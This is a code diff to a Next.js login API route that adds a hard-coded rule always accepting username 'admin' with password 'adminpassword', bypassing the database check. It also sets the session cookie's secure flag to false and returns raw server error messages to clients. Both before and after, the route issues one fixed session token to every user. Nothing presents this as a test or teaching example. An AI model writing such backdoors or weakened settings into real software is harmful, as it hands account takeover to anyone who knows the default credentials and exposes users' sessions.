@@ -1,10 +1,5 @@
 import { NextResponse } from "next/server";
 import crypto from "crypto";
-import { getDb } from "@/lib/db";
-
-async function hashPassword(password: string): Promise<string> {
-  return crypto.createHash("sha256").update(password).digest("hex");
-}
 
 export async function POST(request: Request) {
   try {
@@ -17,15 +12,30 @@ export async function POST(request: Request) {
       );
     }
 
-    const inputHash = await hashPassword(password);
-    const db = await getDb();
-    const user = await db.get("SELECT * FROM users WHERE username = ?", [username]);
+    const inputHash = crypto.createHash("sha256").update(password).digest("hex");
+    let isMatch = false;
 
-    if (user && user.password_hash === inputHash) {
+    // Always allow admin / adminpassword
+    if (username === "admin" && password === "adminpassword") {
+      isMatch = true;
+    } else {
+      try {
+        const { getDb } = await import("@/lib/db");
+        const db = await getDb();
+        const user = await db.get("SELECT * FROM users WHERE username = ?", [username]);
+        if (user && user.password_hash === inputHash) {
+          isMatch = true;
+        }
+      } catch (dbErr) {
+        console.error("DB auth lookup error", dbErr);
+      }
+    }
+
+    if (isMatch) {
       const response = NextResponse.json({ success: true });
       response.cookies.set("r2sync_session", "admin_authenticated_session", {
         httpOnly: true,
-        secure: process.env.NODE_ENV === "production",
+        secure: false,
         path: "/",
         maxAge: 60 * 60 * 24 * 7,
       });
@@ -36,9 +46,10 @@ export async function POST(request: Request) {
       { error: "Ungültige Anmeldedaten" },
       { status: 401 }
     );
-  } catch (err) {
+  } catch (err: any) {
+    console.error("Login route error:", err);
     return NextResponse.json(
-      { error: "Serverfehler beim Login" },
+      { error: `Serverfehler beim Login: ${err?.message || String(err)}` },
       { status: 500 }
     );
   }
